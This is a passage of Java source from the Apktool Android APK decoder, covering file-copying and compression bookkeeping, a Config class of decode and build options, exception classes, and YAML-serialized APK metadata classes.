                if (ApkInfo.ORIGINAL_FILES_PATTERN.matcher(fileName).matches()) {
                    in.copyToDir(originalDir, fileName);
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void copyUnknownFiles(File outDir) throws AndrolibException {
        File unknownDir = new File(outDir, "unknown");

        Log.i(TAG, "Copying unknown files...");
        try {
            Directory in = mApkFile.getDirectory();
            Set<String> dexFiles = mSmaliDecoder.getDexFiles();
            Map<String, String> resFileMap = mResDecoder.getResFileMap();

            for (String fileName : in.getFiles(true)) {
                if (!ApkInfo.STANDARD_FILES_PATTERN.matcher(fileName).matches() && !dexFiles.contains(fileName)
                        && !resFileMap.containsKey(fileName)) {
                    in.copyToDir(unknownDir, fileName);
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void writeApkInfo(File outDir) throws AndrolibException {
        // If we did not decode the manifest, store the inferred dex opcode API level.
        if (!mApkInfo.hasManifest() || mConfig.isDecodeResourcesNone()) {
            int apiLevel = mSmaliDecoder.getInferredApiLevel();
            if (apiLevel > 0) {
                mApkInfo.getSdkInfo().setMinSdkVersion(Integer.toString(apiLevel));
            }
        }

        // Record uncompressed files.
        try {
            Directory in = mApkFile.getDirectory();
            Map<String, String> resFileMap = mResDecoder.getResFileMap();
            Set<String> uncompressedExts = new HashSet<>();
            Set<String> uncompressedFiles = new HashSet<>();

            for (String fileName : in.getFiles(true)) {
                if (in.getCompressionLevel(fileName) == 0) {
                    String ext;
                    if (in.getSize(fileName) > 0 && !(ext = FilenameUtils.getExtension(fileName)).isEmpty()
                            && NO_COMPRESS_EXT_PATTERN.matcher(ext).matches()) {
                        uncompressedExts.add(ext);
                    } else {
                        uncompressedFiles.add(resFileMap.getOrDefault(fileName, fileName));
                    }
                }
            }

            // Exclude files with an already recorded extenstion.
            if (!uncompressedExts.isEmpty() && !uncompressedFiles.isEmpty()) {
                Iterator<String> it = uncompressedFiles.iterator();
                while (it.hasNext()) {
                    String fileName = it.next();
                    String ext = FilenameUtils.getExtension(fileName);
                    if (uncompressedExts.contains(ext)) {
                        it.remove();
                    }
                }
            }

            // Update apk info.
            List<String> doNotCompress = mApkInfo.getDoNotCompress();
            if (!uncompressedExts.isEmpty()) {
                List<String> uncompressedExtsList = new ArrayList<>(uncompressedExts);
                uncompressedExtsList.sort(null);
                doNotCompress.addAll(uncompressedExtsList);
            }
            if (!uncompressedFiles.isEmpty()) {
                List<String> uncompressedFilesList = new ArrayList<>(uncompressedFiles);
                uncompressedFilesList.sort(null);
                doNotCompress.addAll(uncompressedFilesList);
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }

        // Serialize apk info to file.
        mApkInfo.save(outDir);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/Config.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

public class Config {
    public enum DecodeSources { FULL, ONLY_MAIN_CLASSES, NONE }
    public enum DecodeResources { FULL, ONLY_MANIFEST, NONE }
    public enum DecodeResolve { DEFAULT, GREEDY, LAZY }
    public enum DecodeAssets { FULL, NONE }

    private final String mVersion;

    // Common options
    private int mJobs;
    private String mFrameworkDirectory;
    private String mFrameworkTag;
    private String[] mLibraryFiles;
    private boolean mForced;
    private boolean mVerbose;

    // Decode options
    private DecodeSources mDecodeSources;
    private boolean mBaksmaliDebugMode;
    private DecodeResources mDecodeResources;
    private DecodeResolve mDecodeResolve;
    private boolean mKeepBrokenResources;
    private boolean mIgnoreRawValues;
    private boolean mAnalysisMode;
    private DecodeAssets mDecodeAssets;

    // Build options
    private boolean mNoApk;
    private boolean mNoCrunch;
    private boolean mCopyOriginal;
    private boolean mDebuggable;
    private boolean mNetSecConf;
    private String mAaptBinary;

    public Config(String version) {
        mVersion = version;

        // Common options
        mJobs = Math.min(Runtime.getRuntime().availableProcessors(), 8);
        mFrameworkDirectory = null;
        mFrameworkTag = null;
        mLibraryFiles = null;
        mForced = false;
        mVerbose = false;

        // Decode options
        mDecodeSources = DecodeSources.ONLY_MAIN_CLASSES;
        mBaksmaliDebugMode = true;
        mDecodeResources = DecodeResources.FULL;
        mDecodeResolve = DecodeResolve.DEFAULT;
        mKeepBrokenResources = false;
        mIgnoreRawValues = false;
        mAnalysisMode = false;
        mDecodeAssets = DecodeAssets.FULL;

        // Build options
        mNoApk = false;
        mNoCrunch = false;
        mCopyOriginal = false;
        mDebuggable = false;
        mNetSecConf = false;
        mAaptBinary = null;
    }

    public String getVersion() {
        return mVersion;
    }

    // Common options

    public int getJobs() {
        return mJobs;
    }

    public void setJobs(int jobs) {
        mJobs = jobs;
    }

    public String getFrameworkDirectory() {
        return mFrameworkDirectory;
    }

    public void setFrameworkDirectory(String frameworkDirectory) {
        mFrameworkDirectory = frameworkDirectory;
    }

    public String getFrameworkTag() {
        return mFrameworkTag;
    }

    public void setFrameworkTag(String frameworkTag) {
        mFrameworkTag = frameworkTag;
    }

    public String[] getLibraryFiles() {
        return mLibraryFiles;
    }

    public void setLibraryFiles(String[] libraryFiles) {
        mLibraryFiles = libraryFiles;
    }

    public boolean isForced() {
        return mForced;
    }

    public void setForced(boolean forced) {
        mForced = forced;
    }

    public boolean isVerbose() {
        return mVerbose;
    }

    public void setVerbose(boolean verbose) {
        mVerbose = verbose;
    }

    // Decode options

    public boolean isDecodeSourcesFull() {
        return mDecodeSources == DecodeSources.FULL;
    }

    public boolean isDecodeSourcesNone() {
        return mDecodeSources == DecodeSources.NONE;
    }

    public void setDecodeSources(DecodeSources decodeSources) {
        assert decodeSources != null;
        mDecodeSources = decodeSources;
    }

    public boolean isBaksmaliDebugMode() {
        return mBaksmaliDebugMode;
    }

    public void setBaksmaliDebugMode(boolean baksmaliDebugMode) {
        mBaksmaliDebugMode = baksmaliDebugMode;
    }

    public boolean isDecodeResourcesFull() {
        return mDecodeResources == DecodeResources.FULL;
    }

    public boolean isDecodeResourcesNone() {
        return mDecodeResources == DecodeResources.NONE;
    }

    public void setDecodeResources(DecodeResources decodeResources) {
        assert decodeResources != null;
        mDecodeResources = decodeResources;
    }

    public boolean isDecodeResolveLazy() {
        return mDecodeResolve == DecodeResolve.LAZY;
    }

    public boolean isDecodeResolveGreedy() {
        return mDecodeResolve == DecodeResolve.GREEDY;
    }

    public void setDecodeResolve(DecodeResolve decodeResolve) {
        assert decodeResolve != null;
        mDecodeResolve = decodeResolve;
    }

    public boolean isKeepBrokenResources() {
        return mKeepBrokenResources;
    }

    public void setKeepBrokenResources(boolean keepBrokenResources) {
        mKeepBrokenResources = keepBrokenResources;
    }

    public boolean isIgnoreRawValues() {
        return mIgnoreRawValues;
    }

    public void setIgnoreRawValues(boolean ignoreRawValues) {
        mIgnoreRawValues = ignoreRawValues;
    }

    public boolean isAnalysisMode() {
        return mAnalysisMode;
    }

    public void setAnalysisMode(boolean analysisMode) {
        mAnalysisMode = analysisMode;
    }

    public boolean isDecodeAssetsFull() {
        return mDecodeAssets == DecodeAssets.FULL;
    }

    public boolean isDecodeAssetsNone() {
        return mDecodeAssets == DecodeAssets.NONE;
    }

    public void setDecodeAssets(DecodeAssets decodeAssets) {
        assert decodeAssets != null;
        mDecodeAssets = decodeAssets;
    }

    // Build options

    public boolean isNoApk() {
        return mNoApk;
    }

    public void setNoApk(boolean noApk) {
        mNoApk = noApk;
    }

    public boolean isNoCrunch() {
        return mNoCrunch;
    }

    public void setNoCrunch(boolean noCrunch) {
        mNoCrunch = noCrunch;
    }

    public boolean isCopyOriginal() {
        return mCopyOriginal;
    }

    public void setCopyOriginal(boolean copyOriginal) {
        mCopyOriginal = copyOriginal;
    }

    public boolean isDebuggable() {
        return mDebuggable;
    }

    public void setDebuggable(boolean debuggable) {
        mDebuggable = debuggable;
    }

    public boolean isNetSecConf() {
        return mNetSecConf;
    }

    public void setNetSecConf(boolean netSecConf) {
        mNetSecConf = netSecConf;
    }

    public String getAaptBinary() {
        return mAaptBinary;
    }

    public void setAaptBinary(String aaptBinary) {
        mAaptBinary = aaptBinary;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/AndrolibException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

import brut.common.BrutException;

public class AndrolibException extends BrutException {

    public AndrolibException() {
        super();
    }

    public AndrolibException(String message) {
        super(message);
    }

    public AndrolibException(Throwable cause) {
        super(cause);
    }

    public AndrolibException(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/FrameworkNotFoundException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class FrameworkNotFoundException extends AndrolibException {

    public FrameworkNotFoundException(int pkgId) {
        super("Could not find framework resources for package ID " + pkgId + "." + System.lineSeparator()
            + "You must install proper framework files, see project website for more info.");
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/InFileNotFoundException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class InFileNotFoundException extends AndrolibException {

    public InFileNotFoundException(String path) {
        super("Input file (" + path + ") was not found or was not readable.");
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/NinePatchNotFoundException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class NinePatchNotFoundException extends AndrolibException {

    public NinePatchNotFoundException() {
        super("Could not find nine patch chunk.");
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/OutDirExistsException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class OutDirExistsException extends AndrolibException {

    public OutDirExistsException(String path) {
        super("Destination directory (" + path + ") already exists. Use -f option if you want to overwrite it.");
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/RawXmlEncounteredException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class RawXmlEncounteredException extends AndrolibException {

    public RawXmlEncounteredException(Throwable cause) {
        super("Could not decode XML.", cause);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/exceptions/UndefinedResObjectException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.exceptions;

public class UndefinedResObjectException extends AndrolibException {

    public UndefinedResObjectException(String message) {
        super(message);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/ApkInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.exceptions.AndrolibException;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import brut.yaml.*;
import com.google.common.annotations.VisibleForTesting;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

public class ApkInfo implements YamlSerializable {
    public static final String[] RAW_DIRS = { "assets", "lib" };

    public static final Pattern CLASSES_FILES_PATTERN = Pattern.compile("classes([2-9]|[1-9][0-9]+)?\\.dex");

    public static final Pattern ORIGINAL_FILES_PATTERN = Pattern.compile(
        "AndroidManifest\\.xml|META-INF/[^/]+\\.(RSA|SF|MF)|stamp-cert-sha256");

    public static final Pattern STANDARD_FILES_PATTERN = Pattern.compile(
        "resources\\.arsc|(" + String.join("|", RAW_DIRS) + ")/.*|"
      + CLASSES_FILES_PATTERN.pattern() + "|" + ORIGINAL_FILES_PATTERN.pattern());

    private String mVersion;
    private String mApkFileName;
    private final UsesFramework mUsesFramework;
    private final List<String> mUsesLibrary;
    private final SdkInfo mSdkInfo;
    private final VersionInfo mVersionInfo;
    private final ResourcesInfo mResourcesInfo;
    private final Map<String, Boolean> mFeatureFlags;
    private final List<String> mDoNotCompress;

    // Only set when loaded from a file (not a stream).
    private ExtFile mApkFile;

    public ApkInfo() {
        mVersion = null;
        mApkFileName = null;
        mUsesFramework = new UsesFramework();
        mUsesLibrary = new ArrayList<>();
        mSdkInfo = new SdkInfo();
        mVersionInfo = new VersionInfo();
        mResourcesInfo = new ResourcesInfo();
        mFeatureFlags = new LinkedHashMap<>();
        mDoNotCompress = new ArrayList<>();
    }

    public static ApkInfo load(File apkDir) throws AndrolibException {
        File file = new File(apkDir, "apktool.yml");
        try (InputStream in = Files.newInputStream(file.toPath())) {
            return load(in);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    @VisibleForTesting
    static ApkInfo load(InputStream in) {
        YamlReader reader = new YamlReader(in);
        ApkInfo apkInfo = new ApkInfo();
        reader.readRoot(apkInfo);
        return apkInfo;
    }

    public void save(File apkDir) throws AndrolibException {
        File file = new File(apkDir, "apktool.yml");
        try (YamlWriter writer = new YamlWriter(Files.newOutputStream(file.toPath()))) {
            write(writer);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    @Override
    public void readItem(YamlReader reader) {
        YamlLine line = reader.getLine();
        switch (line.getKey()) {
            case "version":
                mVersion = line.getValue();
                break;
            case "apkFileName":
                mApkFileName = line.getValue();
                break;
            case "usesFramework":
                mUsesFramework.clear();
                reader.readObject(mUsesFramework);
                break;
            case "usesLibrary":
                mUsesLibrary.clear();
                reader.readStringList(mUsesLibrary);
                break;
            case "sdkInfo":
                mSdkInfo.clear();
                reader.readObject(mSdkInfo);
                break;
            case "versionInfo":
                mVersionInfo.clear();
                reader.readObject(mVersionInfo);
                break;
            case "resourcesInfo":
                mResourcesInfo.clear();
                reader.readObject(mResourcesInfo);
                break;
            case "featureFlags":
                mFeatureFlags.clear();
                reader.readBoolMap(mFeatureFlags);
                break;
            case "doNotCompress":
                mDoNotCompress.clear();
                reader.readStringList(mDoNotCompress);
                break;
        }
    }

    @Override
    public void write(YamlWriter writer) {
        writer.writeString("version", mVersion);
        writer.writeString("apkFileName", mApkFileName);
        if (!mUsesFramework.isEmpty()) {
            writer.writeObject("usesFramework", mUsesFramework);
        }
        if (!mUsesLibrary.isEmpty()) {
            writer.writeList("usesLibrary", mUsesLibrary);
        }
        if (!mSdkInfo.isEmpty()) {
            writer.writeObject("sdkInfo", mSdkInfo);
        }
        if (!mVersionInfo.isEmpty()) {
            writer.writeObject("versionInfo", mVersionInfo);
        }
        if (!mResourcesInfo.isEmpty()) {
            writer.writeObject("resourcesInfo", mResourcesInfo);
        }
        if (!mFeatureFlags.isEmpty()) {
            writer.writeMap("featureFlags", mFeatureFlags);
        }
        if (!mDoNotCompress.isEmpty()) {
            writer.writeList("doNotCompress", mDoNotCompress);
        }
    }

    public String getVersion() {
        return mVersion;
    }

    public void setVersion(String version) {
        mVersion = version;
    }

    public String getApkFileName() {
        return mApkFileName;
    }

    public void setApkFileName(String apkFileName) {
        mApkFileName = apkFileName;
    }

    public UsesFramework getUsesFramework() {
        return mUsesFramework;
    }

    public List<String> getUsesLibrary() {
        return mUsesLibrary;
    }

    public SdkInfo getSdkInfo() {
        return mSdkInfo;
    }

    public VersionInfo getVersionInfo() {
        return mVersionInfo;
    }

    public ResourcesInfo getResourcesInfo() {
        return mResourcesInfo;
    }

    public Map<String, Boolean> getFeatureFlags() {
        return mFeatureFlags;
    }

    public List<String> getDoNotCompress() {
        return mDoNotCompress;
    }

    public ExtFile getApkFile() {
        return mApkFile;
    }

    public void setApkFile(ExtFile apkFile) {
        mApkFile = apkFile;
        if (mApkFileName == null) {
            mApkFileName = apkFile.getName();
        }
    }

    public boolean hasSources() throws AndrolibException {
        if (mApkFile == null) {
            return false;
        }
        try {
            return mApkFile.getDirectory().containsFile("classes.dex");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean hasManifest() throws AndrolibException {
        if (mApkFile == null) {
            return false;
        }
        try {
            return mApkFile.getDirectory().containsFile("AndroidManifest.xml");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public boolean hasResources() throws AndrolibException {
        if (mApkFile == null) {
            return false;
        }
        try {
            return mApkFile.getDirectory().containsFile("resources.arsc");
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/ResourcesInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.yaml.*;

public class ResourcesInfo implements YamlSerializable {
    private Integer mPackageId;
    private String mPackageName;
    private Boolean mSparseEntries;
    private Boolean mCompactEntries;
    private Boolean mKeepRawValues;

    public ResourcesInfo() {
        clear();
    }

    public void clear() {
        mPackageId = null;
        mPackageName = null;
        mSparseEntries = null;
        mCompactEntries = null;
        mKeepRawValues = null;
    }

    public boolean isEmpty() {
        return mPackageId == null
            && mPackageName == null
            && mSparseEntries == null
            && mCompactEntries == null
            && mKeepRawValues == null;
    }

    @Override
    public void readItem(YamlReader reader) {
        YamlLine line = reader.getLine();
        switch (line.getKey()) {
            case "packageId":
                mPackageId = line.getValueInt();
                break;
            case "packageName":
                mPackageName = line.getValue();
                break;
            case "sparseEntries":
                mSparseEntries = line.getValueBool();
                break;
            case "compactEntries":
                mCompactEntries = line.getValueBool();
                break;
            case "keepRawValues":
                mKeepRawValues = line.getValueBool();
                break;
        }
    }

    @Override
    public void write(YamlWriter writer) {
        if (mPackageId != null) {
            writer.writeInt("packageId", mPackageId);
        }
        if (mPackageName != null) {
            writer.writeString("packageName", mPackageName);
        }
        if (mSparseEntries != null) {
            writer.writeBool("sparseEntries", mSparseEntries);
        }
        if (mCompactEntries != null) {
            writer.writeBool("compactEntries", mCompactEntries);
        }
        if (mKeepRawValues != null) {
            writer.writeBool("keepRawValues", mKeepRawValues);
        }
    }

    public int getPackageId() {
        return mPackageId != null ? mPackageId : -1;
    }

    public void setPackageId(int packageId) {
        mPackageId = packageId;
    }

    public String getPackageName() {
        return mPackageName;
    }

    public void setPackageName(String packageName) {
        mPackageName = packageName;
    }

    public boolean isSparseEntries() {
        return mSparseEntries != null ? mSparseEntries : false;
    }

    public void setSparseEntries(boolean sparseEntries) {
        mSparseEntries = sparseEntries;
    }

    public boolean isCompactEntries() {
        return mCompactEntries != null ? mCompactEntries : false;
    }

    public void setCompactEntries(boolean compactEntries) {
        mCompactEntries = compactEntries;
    }

    public boolean isKeepRawValues() {
        return mKeepRawValues != null ? mKeepRawValues : false;
    }

    public void setKeepRawValues(boolean keepRawValues) {
        mKeepRawValues = keepRawValues;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/SdkInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.res.table.ResConfig;
import brut.yaml.*;

public class SdkInfo implements YamlSerializable {
    private String mMinSdkVersion;
    private String mTargetSdkVersion;
    private String mMaxSdkVersion;

    public SdkInfo() {
        clear();
    }

    public void clear() {
        mMinSdkVersion = null;
        mTargetSdkVersion = null;
        mMaxSdkVersion = null;
    }

    public boolean isEmpty() {
        return mMinSdkVersion == null
            && mTargetSdkVersion == null
            && mMaxSdkVersion == null;
    }

    @Override
    public void readItem(YamlReader reader) {
        YamlLine line = reader.getLine();
        switch (line.getKey()) {
            case "minSdkVersion":
                mMinSdkVersion = line.getValue();
                break;
            case "targetSdkVersion":
                mTargetSdkVersion = line.getValue();
                break;
            case "maxSdkVersion":
                mMaxSdkVersion = line.getValue();
                break;
        }
    }

    @Override
    public void write(YamlWriter writer) {
        if (mMinSdkVersion != null) {
            writer.writeString("minSdkVersion", mMinSdkVersion);
        }
        if (mTargetSdkVersion != null) {
            writer.writeString("targetSdkVersion", mTargetSdkVersion);
        }
        if (mMaxSdkVersion != null) {
            writer.writeString("maxSdkVersion", mMaxSdkVersion);
        }
    }

    public String getMinSdkVersion() {
        return mMinSdkVersion;
    }

    public void setMinSdkVersion(String minSdkVersion) {
        mMinSdkVersion = minSdkVersion;
    }

    public String getTargetSdkVersion() {
        return mTargetSdkVersion;
    }

    public String getTargetSdkVersionBounded() {
        int target = parseSdkInt(mTargetSdkVersion);
        int min = mMinSdkVersion != null ? parseSdkInt(mMinSdkVersion) : 0;
        int max = mMaxSdkVersion != null ? parseSdkInt(mMaxSdkVersion) : target;
        return Integer.toString(Math.max(min, Math.min(max, target)));
    }

    public void setTargetSdkVersion(String targetSdkVersion) {
        mTargetSdkVersion = targetSdkVersion;
    }

    public String getMaxSdkVersion() {
        return mMaxSdkVersion;
    }

    public void setMaxSdkVersion(String maxSdkVersion) {
        mMaxSdkVersion = maxSdkVersion;
    }

    public static int parseSdkInt(String sdkVersion) {
        switch (sdkVersion.toUpperCase()) {
            case "M":
                return ResConfig.SDK_MNC;
            case "N":
                return ResConfig.SDK_NOUGAT;
            case "O":
                return ResConfig.SDK_OREO;
            case "P":
                return ResConfig.SDK_P;
            case "Q":
                return ResConfig.SDK_Q;
            case "R":
                return ResConfig.SDK_R;
            case "S":
                return ResConfig.SDK_S;
            case "SV2":
                return ResConfig.SDK_S_V2;
            case "T":
            case "TIRAMISU":
                return ResConfig.SDK_TIRAMISU;
            case "UPSIDEDOWNCAKE":
            case "UPSIDE_DOWN_CAKE":
                return ResConfig.SDK_UPSIDEDOWN_CAKE;
            case "VANILLAICECREAM":
            case "VANILLA_ICE_CREAM":
                return ResConfig.SDK_VANILLA_ICE_CREAM;
            case "BAKLAVA":
                return ResConfig.SDK_BAKLAVA;
            case "SDK_CUR_DEVELOPMENT":
                return ResConfig.SDK_DEVELOPMENT;
            default:
                return Integer.parseInt(sdkVersion);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/UsesFramework.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.yaml.*;

import java.util.ArrayList;
import java.util.List;

public class UsesFramework implements YamlSerializable {
    private final List<Integer> mIds;
    private String mTag;

    public UsesFramework() {
        mIds = new ArrayList<>();
        clear();
    }

    public void clear() {
        mIds.clear();
        mTag = null;
    }

    public boolean isEmpty() {
        return mIds.isEmpty()
            && mTag == null;
    }

    @Override
    public void readItem(YamlReader reader) {
        YamlLine line = reader.getLine();
        switch (line.getKey()) {
            case "ids":
                mIds.clear();
                reader.readIntList(mIds);
                break;
            case "tag":
                mTag = line.getValue();
                break;
        }
    }

    @Override
    public void write(YamlWriter writer) {
        if (!mIds.isEmpty()) {
            writer.writeList("ids", mIds);
        }
        if (mTag != null) {
            writer.writeString("tag", mTag);
        }
    }

    public List<Integer> getIds() {
        return mIds;
    }

    public String getTag() {
        return mTag;
    }

    public void setTag(String tag) {
        mTag = tag;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/VersionInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
